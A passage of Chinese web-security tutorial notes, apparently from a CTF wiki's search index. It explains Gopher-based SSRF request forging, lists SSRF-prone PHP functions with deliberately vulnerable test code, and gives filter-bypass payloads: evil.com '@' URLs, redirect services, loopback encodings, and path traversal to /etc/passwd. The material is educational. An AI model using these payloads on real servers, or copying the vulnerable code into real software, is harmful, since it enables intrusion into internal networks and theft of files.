<p>\u73b0\u5728\u7684Gopher\u534f\u8bae\u5df2\u7ecf\u5f88\u5c11\u6709\u4eba\u518d\u4f7f\u7528\u5b83\u4e86\uff0c\u4f46\u662f\u8be5\u534f\u8bae\u5728SSRF\u4e2d\u5374\u53ef\u4ee5\u53d1\u6325\u5de8\u5927\u7684\u4f5c\u7528\uff0c\u53ef\u4ee5\u8bf4\u662fSSRF\u4e2d\u7684\u4e07\u91d1\u6cb9\u3002\u7531\u4e8eGopher\u534f\u8bae\u652f\u6301\u53d1\u51faGET\u3001POST\u8bf7\u6c42\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u622a\u83b7GET\u8bf7\u6c42\u5305\u548cPOST\u8bf7\u6c42\u5305\uff0c\u518d\u6784\u9020\u6210\u7b26\u5408Gopher\u534f\u8bae\u8bf7\u6c42\u7684payload\u8fdb\u884cSSRF\u5229\u7528\uff0c\u751a\u81f3\u53ef\u4ee5\u7528\u5b83\u6765\u653b\u51fb\u5185\u7f51\u4e2d\u7684Redis\u3001MySql\u3001FastCGI\u7b49\u5e94\u7528\uff0c\u8fd9\u65e0\u7591\u5927\u5927\u6269\u5c55\u4e86\u6211\u4eec\u7684SSRF\u653b\u51fb\u9762\u3002</p> <p>\uff081\uff09Gopher\u534f\u8bae\u683c\u5f0f</p> <pre><code>URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_\u540e\u63a5TCP\u6570\u636e\u6d41\u200b# \u6ce8\u610f\u4e0d\u8981\u5fd8\u8bb0\u540e\u9762\u90a3\u4e2a\u4e0b\u5212\u7ebf\"_\"\uff0c\u4e0b\u5212\u7ebf\"_\"\u540e\u9762\u624d\u5f00\u59cb\u63a5TCP\u6570\u636e\u6d41\uff0c\u5982\u679c\u4e0d\u52a0\u8fd9\u4e2a\"_\"\uff0c\u90a3\u4e48\u670d\u52a1\u7aef\u6536\u5230\u7684\u6d88\u606f\u5c06\u4e0d\u662f\u5b8c\u6574\u7684\uff0c\u8be5\u5b57\u7b26\u53ef\u968f\u610f\u5199\u3002\nPlain Text\n</code></pre> <p>gopher\u7684\u9ed8\u8ba4\u7aef\u53e3\u662f70</p> <ul> <li> <p>\u5982\u679c\u53d1\u8d77POST\u8bf7\u6c42\uff0c\u56de\u8f66\u6362\u884c\u9700\u8981\u4f7f\u7528<code>%0d%0a</code>\u6765\u4ee3\u66ff<code>%0a</code>\uff0c\u5982\u679c\u591a\u4e2a\u53c2\u6570\uff0c\u53c2\u6570\u4e4b\u95f4\u7684&amp;\u4e5f\u9700\u8981\u8fdb\u884cURL\u7f16\u7801</p> </li> <li> <p>\u90a3\u4e48\u5982\u4f55\u5229\u7528Gopher\u53d1\u9001HTTP\u7684\u8bf7\u6c42\u5462\uff1f\u4f8b\u5982GET\u8bf7\u6c42\u3002\u6211\u4eec\u76f4\u63a5\u53d1\u9001\u4e00\u4e2a\u539f\u59cb\u7684HTTP\u5305\u4e0d\u5c31\u884c\u4e86\u5417\u3002\u5728gopher\u534f\u8bae\u4e2d\u53d1\u9001HTTP\u7684\u6570\u636e\uff0c\u9700\u8981\u4ee5\u4e0b\u4e09\u6b65\uff1a</p> </li> </ul> <p>\uff082\uff09\u5229\u7528Gopher\u534f\u8bae\u53d1\u9001HTTP GET\u8bf7\u6c42</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// echo.php&lt;?phpecho \"Hello \".$_GET[\"whoami\"].\"\\n\"?&gt;\nPlain Text\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u6784\u9020payload\u3002\u4e00\u4e2a\u5178\u578b\u7684GET\u578b\u7684HTTP\u5305\u7c7b\u4f3c\u5982\u4e0b\uff1a</p> <pre><code>GET /echo.php?whoami=Bunny HTTP/1.1Host: 47.xxx.xxx.72\nPlain Text\n</code></pre> <p>\u7136\u540e\u5229\u7528\u4ee5\u4e0b\u811a\u672c\u8fdb\u884c\u4e00\u6b65\u751f\u6210\u7b26\u5408Gopher\u534f\u8bae\u683c\u5f0f\u7684payload\uff1a</p> <pre><code>import urllib.parsepayload =\\\"\"\"GET /echo.php?whoami=Bunny HTTP/1.1Host: 47.xxx.xxx.72\"\"\" \u00a0# \u6ce8\u610f\u540e\u9762\u4e00\u5b9a\u8981\u6709\u56de\u8f66\uff0c\u56de\u8f66\u7ed3\u5c3e\u8868\u793ahttp\u8bf7\u6c42\u7ed3\u675ftmp = urllib.parse.quote(payload)new = tmp.replace('%0A','%0D%0A')result = 'gopher://47.xxx.xxx.72:80/'+'_'+newprint(result)\nPlain Text\n</code></pre> <p></p> <p>\u6ce8\u610f\u8fd9\u51e0\u4e2a\u95ee\u9898\uff1a</p> <p>\u7136\u540e\u6267\u884c\uff1a</p> <pre><code>curl gopher://47.xxx.xxx.72:80/_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A\nPlain Text\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\uff0c\u6210\u529f\u7528GET\u65b9\u6cd5\u4f20\u53c2\u5e76\u8f93\u51fa\u201cHello Bunny\u201d\u3002</p> <p>\uff083\uff09\u5229\u7528Gopher\u534f\u8bae\u53d1\u9001HTTP POST\u8bf7\u6c42</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// echo.php&lt;?phpecho \"Hello \".$_POST[\"whoami\"].\"\\n\"?&gt;\nPlain Text\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u6784\u9020payload\u3002\u4e00\u4e2a\u5178\u578b\u7684POST\u578b\u7684HTTP\u5305\u7c7b\u4f3c\u5982\u4e0b\uff1a</p> <pre><code>POST /echo.php HTTP/1.1Host: 47.xxx.xxx.72Content-Type: application/x-www-form-urlencodedContent-Length: 12\nwhoami=Bunny\nPlain Text\n</code></pre> <p>\u6ce8\u610f\uff1a\u4e0a\u9762\u90a3\u56db\u4e2aHTTP\u5934\u662fPOST\u8bf7\u6c42\u5fc5\u987b\u7684\uff0c\u5373POST\u3001Host\u3001Content-Type\u548cContent-Length\u3002\u5982\u679c\u5c11\u4e86\u4f1a\u62a5\u9519\u7684\uff0c\u800cGET\u5219\u4e0d\u7528\u3002\u5e76\u4e14\uff0c\u7279\u522b\u8981\u6ce8\u610fContent-Length\u5e94\u4e3a\u5b57\u7b26\u4e32\u201cwhoami=Bunny\u201d\u7684\u957f\u5ea6\u3002</p> <p>\u6700\u540e\u7528\u811a\u672c\u6211\u4eec\u5c06\u4e0a\u9762\u7684POST\u6570\u636e\u5305\u8fdb\u884cURL\u7f16\u7801\u5e76\u6539\u4e3agopher\u534f\u8bae</p> <pre><code>import urllib.parsepayload =\\\"\"\"POST /echo.php HTTP/1.1Host: 47.xxx.xxx.72Content-Type: application/x-www-form-urlencodedContent-Length: 12\nwhoami=Bunny\"\"\"  # \u6ce8\u610f\u540e\u9762\u4e00\u5b9a\u8981\u6709\u56de\u8f66\uff0c\u56de\u8f66\u7ed3\u5c3e\u8868\u793ahttp\u8bf7\u6c42\u7ed3\u675ftmp = urllib.parse.quote(payload)new = tmp.replace('%0A','%0D%0A')result = 'gopher://47.xxx.xxx.72:80/'+'_'+newprint(result)\nPlain Text\n</code></pre> <p></p> <p>\u7136\u540e\u6267\u884c\uff1a</p> <pre><code>curl gopher://47.xxx.xxx.72:80/_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A\nPlain Text\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\uff0c\u6210\u529f\u7528POST\u65b9\u6cd5\u4f20\u53c2\u5e76\u8f93\u51fa\u201cHello Bunny\u201d\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/","title":"SSRF","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u4e2a\u7f51\u4e0a\u8d44\u6599\u5c31\u591a\u5f88\u591a\u4e86\u6211\u9009\u62e9copy</p> <p>\u81ea\u5df1\u6765\u5199\u4e0d\u77e5\u9053\u54ea\u91cc\u5f00\u59cb\u5199\u8d77\u6765</p> <p>SSRF(Server-Side Request Forgery:\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020)\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF\u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u7f51\u3002\uff08\u6b63\u56e0\u4e3a\u5b83\u662f\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u7684\uff0c\u6240\u4ee5\u5b83\u80fd\u591f\u8bf7\u6c42\u5230\u4e0e\u5b83\u76f8\u8fde\u800c\u4e0e\u5916\u7f51\u9694\u79bb\u7684\u5185\u7f51\uff09</p> <p>SSRF\u5f62\u6210\u7684\u539f\u56e0\u5927\u90fd\u662f\u7531\u4e8e\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u505a\u8fc7\u6ee4\u548c\u9650\u5236\u3002\u5373SSRF\u6f0f\u6d1e\u5c31\u662f\u901a\u8fc7\u7be1\u6539\u83b7\u53d6\u8d44\u6e90\u7684\u8bf7\u6c42\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u4f46\u662f\u670d\u52a1\u5668\u5e76\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e2a\u8bf7\u6c42\u662f\u975e\u6cd5\u7684\uff0c\u7136\u540e\u670d\u52a1\u5668\u4ee5\u4ed6\u7684\u8eab\u4efd\u6765\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u5668\u7684\u8d44\u6e90\u3002</p> <p></p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#_1","title":"\u6f0f\u6d1e\u51fd\u6570","text":"<p>SSRF\u6f0f\u6d1e\u76f8\u5173\u51fd\u6570\u548c\u7c7b</p> <p>file_get_contents()\uff1a\u5c06\u6574\u4e2a\u6587\u4ef6\u6216\u4e00\u4e2aurl\u6240\u6307\u5411\u7684\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u3002</p> <ul> <li> <p>readfile()\uff1a\u8f93\u51fa\u4e00\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002</p> </li> <li> <p>fsockopen()\uff1a\u6253\u5f00\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u6216\u8005\u4e00\u4e2aUnix \u5957\u63a5\u5b57\u8fde\u63a5\u3002</p> </li> <li> <p>curl_exec()\uff1a\u521d\u59cb\u5316\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd\uff0c\u8fd4\u56de\u4e00\u4e2acURL\u53e5\u67c4\uff0c\u4f9bcurl_setopt()\uff0ccurl_exec()\u548ccurl_close() \u51fd\u6570\u4f7f\u7528\u3002</p> </li> <li> <p>fopen()\uff1a\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u6587\u4ef6\u6216\u8005 URL\u3002</p> </li> <li> <p>\u4e0a\u8ff0\u51fd\u6570\u51fd\u6570\u4f7f\u7528\u4e0d\u5f53\u4f1a\u9020\u6210SSRF\u6f0f\u6d1e\u3002 \u6b64\u5916\uff0cPHP\u539f\u751f\u7c7bSoapClient\u5728\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u65f6\u53ef\u5bfc\u81f4SSRF\u3002(\u8bb0\u5f97\u5417\uff1f\u4e4b\u524d\u7684soapclient,ssrf+crlf)</p> </li> </ul>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#file_get_contents","title":"file_get_contents()","text":"<p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?php$url = $_GET['url'];;echo file_get_contents($url);?&gt;\nPlain Text\n</code></pre> <p>\u4e0a\u8ff0\u6d4b\u8bd5\u4ee3\u7801\u4e2d\uff0cfile_get_contents() \u51fd\u6570\u5c06\u6574\u4e2a\u6587\u4ef6\u6216\u4e00\u4e2aurl\u6240\u6307\u5411\u7684\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u5e76\u5c55\u793a\u7ed9\u7528\u6237\uff0c\u6211\u4eec\u6784\u9020\u7c7b\u4f3c<code>ssrf.php?url=../../../../../etc/passwd</code>\u7684paylaod\u5373\u53ef\u8bfb\u53d6\u670d\u52a1\u5668\u672c\u5730\u7684\u4efb\u610f\u6587\u4ef6\u3002(\u8def\u5f84\u7a7f\u8d8a\uff0c\u5199\u5230\u540e\u9762\u662f\u6709\u4e1c\u897f\u4e32\u8d77\u6765\u7684)</p> <p></p> <p>readfile()\u51fd\u6570\u4e0efile_get_contents()\u51fd\u6570\u76f8\u4f3c\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#fsockopen","title":"fsockopen()","text":"<p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>\u7528\u4e8e\u6253\u5f00\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u6216\u8005\u4e00\u4e2aUnix \u5957\u63a5\u5b57\u8fde\u63a5\uff0c\u521d\u59cb\u5316\u4e00\u4e2a\u5957\u63a5\u5b57\u8fde\u63a5\u5230\u6307\u5b9a\u4e3b\u673a\uff08hostname\uff09\uff0c\u5b9e\u73b0\u5bf9\u7528\u6237\u6307\u5b9aurl\u6570\u636e\u7684\u83b7\u53d6\u3002\u8be5\u51fd\u6570\u4f1a\u4f7f\u7528socket\u8ddf\u670d\u52a1\u5668\u5efa\u7acbtcp\u8fde\u63a5\uff0c\u8fdb\u884c\u4f20\u8f93\u539f\u59cb\u6570\u636e\u3002 fsockopen()\u5c06\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u53e5\u67c4\uff0c\u4e4b\u540e\u53ef\u4ee5\u88ab\u5176\u4ed6\u6587\u4ef6\u7c7b\u51fd\u6570\u8c03\u7528\uff08\u4f8b\u5982\uff1afgets()\uff0cfgetss()\uff0cfwrite()\uff0cfclose()\u8fd8\u6709feof()\uff09\u3002\u5982\u679c\u8c03\u7528\u5931\u8d25\uff0c\u5c06\u8fd4\u56defalse\u3002</p> <pre><code>// ssrf.php\n&lt;?php\n$host=$_GET['url'];\n$fp = fsockopen($host, 80, $errno, $errstr, 30);\nif (!$fp) {\necho \"$errstr ($errno)&lt;br /&gt;\\n\";\n} else {\n$out = \"GET / HTTP/1.1\\r\\n\";\n$out .= \"Host: $host\\r\\n\";\n$out .= \"Connection: Close\\r\\n\\r\\n\";\nfwrite($fp, $out);\nwhile (!feof($fp)) {\necho fgets($fp, 128);\n}\nfclose($fp);\n}\n?&gt;\nPlain Text\n</code></pre> <p>\u6784\u9020<code>ssrf.php?url=www.baidu.com</code>\u5373\u53ef\u6210\u529f\u89e6\u53d1ssrf\u5e76\u8fd4\u56de\u767e\u5ea6\u4e3b\u9875\uff1a</p> <p></p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#curl_exec","title":"curl_exec()","text":"<p>curl_init(url)\u51fd\u6570\u521d\u59cb\u5316\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd\uff0c\u8fd4\u56de\u4e00\u4e2acURL\u53e5\u67c4\uff0c\u4f9bcurl_setopt()\uff0ccurl_exec()\u548ccurl_close() \u51fd\u6570\u4f7f\u7528\u3002</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?php if (isset($_GET['url'])){  $link = $_GET['url'];   $curlobj = curl_init(); // \u521b\u5efa\u65b0\u7684 cURL \u8d44\u6e90 curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // \u8bbe\u7f6e URL \u548c\u76f8\u5e94\u7684\u9009\u9879  $result=curl_exec($curlobj); // \u6293\u53d6 URL \u5e76\u628a\u5b83\u4f20\u9012\u7ed9\u6d4f\u89c8\u5668    curl_close($curlobj); // \u5173\u95ed cURL \u8d44\u6e90\uff0c\u5e76\u4e14\u91ca\u653e\u7cfb\u7edf\u8d44\u6e90    // $filename = './curled/'.rand().'.txt';   // file_put_contents($filename, $result);   echo $result;}?&gt;\nPlain Text\n</code></pre> <p>\u6784\u9020<code>ssrf.php?url=www.baidu.com</code>\u5373\u53ef\u6210\u529f\u89e6\u53d1ssrf\u5e76\u8fd4\u56de\u767e\u5ea6\u4e3b\u9875\uff1a</p> <p></p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#soapclient","title":"SoapClient","text":"<p>\u7701\u7565\u4e86</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#_2","title":"\u7ed5\u8fc7\u59ff\u52bf","text":"<p>\u5bf9\u4e8eSSRF\u7684\u9650\u5236\u5927\u81f4\u6709\u5982\u4e0b\u51e0\u79cd\uff1a</p> <p>\u9650\u5236\u8bf7\u6c42\u7684\u7aef\u53e3\u53ea\u80fd\u4e3aWeb\u7aef\u53e3\uff0c\u53ea\u5141\u8bb8\u8bbf\u95eeHTTP\u548cHTTPS\u7684\u8bf7\u6c42\u3002</p> <ul> <li>\u9650\u5236\u57df\u540d\u53ea\u80fd\u4e3ahttp://www.xxx.com</li> </ul> <p>\u9650\u5236\u4e0d\u80fd\u8bbf\u95ee\u5185\u7f51\u7684IP\uff0c\u4ee5\u9632\u6b62\u5bf9\u5185\u7f51\u8fdb\u884c\u653b\u51fb\u3002</p> <ul> <li> <p>\u5c4f\u853d\u8fd4\u56de\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> </li> <li></li> </ul>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#http","title":"\u5229\u7528HTTP\u57fa\u672c\u8eab\u4efd\u8ba4\u8bc1\u7684\u65b9\u5f0f\u7ed5\u8fc7","text":"<p>\u5982\u679c\u76ee\u6807\u4ee3\u7801\u9650\u5236\u8bbf\u95ee\u7684\u57df\u540d\u53ea\u80fd\u4e3ahttp://www.xxx.com\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u91c7\u7528HTTP\u57fa\u672c\u8eab\u4efd\u8ba4\u8bc1\u7684\u65b9\u5f0f\u7ed5\u8fc7\u3002\u5373@\uff1ahttp://www.xxx.com@www.evil.com</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#302ip","title":"\u5229\u7528302\u8df3\u8f6c\u7ed5\u8fc7\u5185\u7f51IP","text":"<p>\u7ed5\u8fc7\u5bf9\u5185\u7f51ip\u7684\u9650\u5236\u6211\u4eec\u53ef\u4ee5\u5229\u7528302\u8df3\u8f6c\u7684\u65b9\u6cd5\uff0c\u6709\u4ee5\u4e0b\u4e24\u79cd\u3002</p> <p>\uff081\uff09\u7f51\u7edc\u4e0a\u5b58\u5728\u4e00\u4e2a\u5f88\u795e\u5947\u7684\u670d\u52a1\uff0c\u7f51\u5740\u4e3ahttp://xip.io\uff0c\u5f53\u8bbf\u95ee\u8fd9\u4e2a\u670d\u52a1\u7684\u4efb\u610f\u5b50\u57df\u540d\u7684\u65f6\u5019\uff0c\u90fd\u4f1a\u91cd\u5b9a\u5411\u5230\u8fd9\u4e2a\u5b50\u57df\u540d\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a</p> <p>\u5f53\u6211\u4eec\u8bbf\u95ee\uff1ahttp://127.0.0.1.xip.io/flag.php\u65f6\uff0c\u5b9e\u9645\u8bbf\u95ee\u7684\u662fhttp://127.0.0.1/1.php\u3002\u50cf\u8fd9\u79cd\u7f51\u5740\u8fd8\u6709http://nip.io\uff0chttp://sslip.io\u3002</p> <p>\u5982\u4e0b\u793a\u4f8b\uff08flag.php\u4ec5\u80fd\u4ece\u672c\u5730\u8bbf\u95ee\uff09\uff1a</p> <p></p> <p>\uff082\uff09\u77ed\u5730\u5740\u8df3\u8f6c\u7ed5\u8fc7\uff0c\u8fd9\u91cc\u4e5f\u7ed9\u51fa\u4e00\u4e2a\u7f51\u5740https://4m.cn/\uff1a</p> <p></p> <p>\u76f4\u63a5\u4f7f\u7528\u751f\u6210\u7684\u77ed\u8fde\u63a5https://4m.cn/FjOdQ\u5c31\u4f1a\u81ea\u52a8302\u8df3\u8f6c\u5230http://127.0.0.1/flag.php\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u7ed5\u8fc7WAF\u4e86\uff1a</p> <p></p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#ip","title":"\u8fdb\u5236\u7684\u8f6c\u6362\u7ed5\u8fc7\u5185\u7f51IP","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u4e0d\u540c\u7684\u8fdb\u5236\u66ff\u4ee3ip\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e2a\u4ece\u7f51\u4e0a\u6252\u7684php\u811a\u672c\u53ef\u4ee5\u4e00\u952e\u8f6c\u6362\uff1a</p> <pre><code>&lt;?php$ip = '127.0.0.1';$ip = explode('.',$ip);$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;if($r &lt; 0) {$r += 4294967296;}echo \"\u5341\u8fdb\u5236:\"; \u00a0 \u00a0 // 2130706433echo $r;echo \"\u516b\u8fdb\u5236:\"; \u00a0 \u00a0 // 0177.0.0.1echo decoct($r);echo \"\u5341\u516d\u8fdb\u5236:\"; \u00a0 // 0x7f.0.0.1echo dechex($r);?&gt;\nPlain Text\n</code></pre>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#127001","title":"\u5176\u4ed6\u5404\u79cd\u6307\u5411127.0.0.1\u7684\u5730\u5740","text":"<pre><code>http://localhost/ \u00a0 \u00a0 \u00a0 \u00a0 # localhost\u5c31\u662f\u4ee3\u6307127.0.0.1http://0/ \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 # 0\u5728window\u4e0b\u4ee3\u88680.0.0.0\uff0c\u800c\u5728liunx\u4e0b\u4ee3\u8868127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/ \u00a0 \u00a0# \u5728liunx\u4e0b\u53ef\u7528\uff0cwindow\u6d4b\u8bd5\u4e86\u4e0b\u4e0d\u884chttp://[::]:80/ \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 # \u5728liunx\u4e0b\u53ef\u7528\uff0cwindow\u6d4b\u8bd5\u4e86\u4e0b\u4e0d\u884chttp://127\u30020\u30020\u30021/ \u00a0 \u00a0 \u00a0 # \u7528\u4e2d\u6587\u53e5\u53f7\u7ed5\u8fc7http://\u2460\u2461\u2466.\u24ea.\u24ea.\u2460http://127.1/http://127.00000.00000.001/ # 0\u7684\u6570\u91cf\u591a\u4e00\u70b9\u5c11\u4e00\u70b9\u90fd\u6ca1\u5f71\u54cd\uff0c\u6700\u540e\u8fd8\u662f\u4f1a\u6307\u5411127.0.0.1\nPlain Text\n</code></pre>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#_3","title":"\u5229\u7528\u4e0d\u5b58\u5728\u7684\u534f\u8bae\u5934\u7ed5\u8fc7\u6307\u5b9a\u7684\u534f\u8bae\u5934","text":"<p><code>file_get_contents()</code>\u51fd\u6570\u7684\u4e00\u4e2a\u7279\u6027\uff0c\u5373\u5f53PHP\u7684<code>file_get_contents()</code>\u51fd\u6570\u5728\u9047\u5230\u4e0d\u8ba4\u8bc6\u7684\u534f\u8bae\u5934\u65f6\u5019\u4f1a\u5c06\u8fd9\u4e2a\u534f\u8bae\u5934\u5f53\u505a\u6587\u4ef6\u5939\uff0c\u9020\u6210\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u8fd9\u65f6\u5019\u53ea\u9700\u4e0d\u65ad\u5f80\u4e0a\u8df3\u8f6c\u76ee\u5f55\u5373\u53ef\u8bfb\u5230\u6839\u76ee\u5f55\u7684\u6587\u4ef6\u3002\uff08include()\u51fd\u6570\u4e5f\u6709\u7c7b\u4f3c\u7684\u7279\u6027\uff09</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?phphighlight_file(__FILE__);if(!preg_match('/^https/is',$_GET['url'])){die(\"no hack\");}echo file_get_contents($_GET['url']);?&gt;\nPlain Text\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u9650\u5236\u4e86url\u53ea\u80fd\u662f\u4ee5https\u5f00\u5934\u7684\u8def\u5f84\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5982\u4e0b\uff1a</p> <pre><code>httpsssss://\nPlain Text\n</code></pre> <p>\u6b64\u65f6<code>file_get_contents()</code>\u51fd\u6570\u9047\u5230\u4e86\u4e0d\u8ba4\u8bc6\u7684\u4f2a\u534f\u8bae\u5934\u201chttpsssss://\u201d\uff0c\u5c31\u4f1a\u5c06\u4ed6\u5f53\u505a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u518d\u914d\u5408\u76ee\u5f55\u7a7f\u8d8a\u5373\u53ef\u8bfb\u53d6\u6587\u4ef6\uff1a</p> <pre><code>ssrf.php?url=httpsssss://../../../../../../etc/passwd\nPlain Text\n</code></pre> <p></p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u5728SSRF\u7684\u4f17\u591a\u534f\u8bae\u88ab\u7981\u6b62\u4e14\u53ea\u80fd\u4f7f\u7528\u5b83\u89c4\u5b9a\u7684\u67d0\u4e9b\u534f\u8bae\u7684\u60c5\u51b5\u4e0b\u6765\u8fdb\u884c\u8bfb\u53d6\u6587\u4ef6\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#url","title":"\u5229\u7528URL\u7684\u89e3\u6790\u95ee\u9898","text":"<p>\u8be5\u601d\u8def\u6765\u81eaOrange Tsai\u6210\u5458\u57282017 BlackHat \u7f8e\u56fd\u9ed1\u5ba2\u5927\u4f1a\u4e0a\u505a\u7684\u9898\u4e3a\u300aA-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages\u300b\u7684\u5206\u4eab\u3002\u4e3b\u8981\u662f\u5229\u7528readfile\u548cparse_url\u51fd\u6570\u7684\u89e3\u6790\u5dee\u5f02\u4ee5\u53cacurl\u548cparse_url\u89e3\u6790\u5dee\u5f02\u6765\u8fdb\u884c\u7ed5\u8fc7\u3002</p> <p>\uff081\uff09\u5229\u7528readfile\u548cparse_url\u51fd\u6570\u7684\u89e3\u6790\u5dee\u5f02\u7ed5\u8fc7\u6307\u5b9a\u7684\u7aef\u53e3</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?php$url = 'http://'. $_GET[url];$parsed = parse_url($url);if( $parsed[port] == 80 ){  // \u8fd9\u91cc\u9650\u5236\u4e86\u6211\u4eec\u4f20\u8fc7\u53bb\u7684url\u53ea\u80fd\u662f80\u7aef\u53e3\u7684    readfile($url);} else { die('Hacker!');}\nPlain Text\n</code></pre> <p>\u7528python\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u8d77\u4e00\u4e2a\u7aef\u53e3\u4e3a11211\u7684WEB\u670d\u52a1\uff1a</p> <p></p> <p>\u4e0a\u8ff0\u4ee3\u7801\u9650\u5236\u4e86\u6211\u4eec\u4f20\u8fc7\u53bb\u7684url\u53ea\u80fd\u662f80\u7aef\u53e3\u7684\uff0c\u4f46\u5982\u679c\u6211\u4eec\u60f3\u53bb\u8bfb\u53d611211\u7aef\u53e3\u7684\u6587\u4ef6\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u4ee5\u4e0b\u65b9\u6cd5\u7ed5\u8fc7\uff1a</p> <pre><code>ssrf.php?url=127.0.0.1:11211:80/flag.txt\nPlain Text\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\u6210\u529f\u8bfb\u53d6\u4e8611211\u7aef\u53e3\u4e2d\u7684flag.txt\u6587\u4ef6\uff0c\u4e0b\u9762\u7528BlackHat\u7684\u56fe\u6765\u8bf4\u660e\u539f\u7406\uff1a</p> <p></p> <p>\u4ece\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u770b\u51fareadfile()\u51fd\u6570\u83b7\u53d6\u7684\u7aef\u53e3\u662f\u6700\u540e\u5192\u53f7\u524d\u9762\u7684\u4e00\u90e8\u5206\uff0811211\uff09\uff0c\u800cparse_url()\u51fd\u6570\u83b7\u53d6\u7684\u5219\u662f\u6700\u540e\u5192\u53f7\u540e\u9762\u7684\u7684\u7aef\u53e3\uff0880\uff09\uff0c\u5229\u7528\u8fd9\u79cd\u5dee\u5f02\u7684\u4e0d\u540c\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u3002</p> 